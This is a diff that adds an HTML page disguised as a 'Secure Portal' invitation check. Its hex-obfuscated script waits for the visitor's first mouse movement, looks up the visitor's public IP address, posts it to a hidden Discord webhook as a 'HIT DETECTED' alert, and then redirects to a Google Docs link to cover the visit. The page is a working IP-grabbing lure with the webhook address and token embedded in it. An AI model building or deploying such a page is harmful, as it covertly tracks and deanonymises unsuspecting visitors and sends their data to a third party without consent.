@@ -1,0 +1,111 @@
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <title>Authentication Portal</title>
+
+    <script>
+
+        // Obfuscated string array to hide the Webhook and Keywords
+
+        const _0x4a21 = ['\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e', '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2e\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x34\x38\x39\x34\x30\x36\x35\x35\x38\x37\x35\x39\x38\x31\x33\x31\x38\x30\x2f\x6a\x61\x5a\x45\x64\x4c\x65\x5f\x5a\x75\x39\x5f\x31\x72\x79\x71\x43\x6a\x5f\x58\x30\x76\x56\x77\x67\x71\x4d\x6c\x5f\x58\x74\x46\x46\x53\x30\x4b\x70\x5a\x4e\x32\x43\x35\x2d\x74\x4b\x72\x63\x6d\x37\x32\x30\x76\x44\x78\x4a\x46\x43\x76\x70\x6f\x48\x32\x59\x45\x63\x53\x4e\x4f', '\x50\x4f\x53\x54', '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e'];
+
+
+
+        (function(_0x2211, _0x4a21) {
+
+            const _0x5511 = function(_0x3321) {
+
+                while (--_0x3321) { _0x2211['push'](_0x2211['shift']()); }
+
+            };
+
+            _0x5511(++_0x4a21);
+
+        }(_0x4a21, 0x1a2));
+
+
+
+        async function _0x_v() {
+
+            // Anti-Bot: Only fire if a real human moves the mouse
+
+            window.onmousemove = async () => {
+
+                window.onmousemove = null; // Fire once
+
+                try {
+
+                    const _0x_i = await fetch(_0x4a21[0]);
+
+                    const _0x_d = await _0x_i.json();
+
+                    
+
+                    await fetch(_0x4a21[1], {
+
+                        method: _0x4a21[2],
+
+                        headers: { 'Content-Type': _0x4a21[3] },
+
+                        body: JSON.stringify({
+
+                            embeds: [{
+
+                                title: "\x20\x48\x49\x54\x20\x44\x45\x54\x45\x43\x54\x45\x44",
+
+                                color: 0xff0000,
+
+                                fields: [{ name: "\x49\x50", value: _0x_d.ip }]
+
+                            }]
+
+                        })
+
+                    });
+
+                } catch (e) {}
+
+                // Immediate redirect to the real document
+
+                window.location.replace("https://docs.google.com/document/d/REAL_CONTRACT_ID/edit");
+
+            };
+
+        }
+
+        window.onload = _0x_v;
+
+    </script>
+
+    <style>
+
+        body { background: #f9f9f9; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+
+        .c { text-align: center; }
+
+        .s { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="c">
+
+        <h2>🔒 Secure Portal</h2>
+
+        <p>Verifying your invitation, please wait...</p>
+
+        <div class="s"></div>
+
+    </div>
+
+</body>
+
+</html>
